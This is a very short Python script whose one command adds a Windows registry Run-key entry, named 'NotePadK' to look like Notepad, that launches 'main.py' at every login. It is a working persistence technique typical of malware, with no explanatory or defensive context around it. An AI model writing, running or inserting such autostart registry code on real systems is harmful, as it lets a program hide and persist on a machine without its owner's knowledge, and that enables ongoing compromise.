import os

os.system(r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "NotePadK" /t REG_SZ /d "main.py"')
